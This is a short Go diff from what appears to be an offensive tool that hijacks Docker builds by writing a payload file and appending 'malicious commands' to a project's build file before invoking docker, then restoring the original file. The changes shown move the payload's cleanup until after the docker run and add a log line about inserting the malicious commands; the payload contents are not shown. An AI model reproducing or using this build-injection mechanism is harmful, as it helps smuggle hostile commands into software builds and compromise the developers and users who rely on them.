@@ -10,7 +10,6 @@ import (
 )
 
 const ExitSuccess = 0
-const ExitFailure = -1
 
 var originalFilePath string
 var originalFileBytes []byte
@@ -47,6 +46,8 @@ func DoHijack(osArgs []string) {
 	invokeDocker(osArgs)
 
 	RestoreBuildFile(osArgs, originalFileBytes)
+
+	os.Remove(PAYLOAD_NAME)
 
 }
 
@@ -91,7 +92,6 @@ func InjectBuildFile(osArgs []string) {
 	}
 	pwd, _ := os.Getwd()
 	log.Println("wrote payload to: ", filepath.Join(pwd, PAYLOAD_NAME))
-	defer os.Remove(PAYLOAD_NAME)
 
 	// append malicious commands to original build file
 	fp, err := os.OpenFile(originalFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
@@ -100,6 +100,7 @@ func InjectBuildFile(osArgs []string) {
 	}
 	defer fp.Close()
 
+	log.Println("inserting malicious commands into build file")
 	_, err = fp.WriteString(string(installPayload))
 	if err != nil {
 		log.Fatal(err)
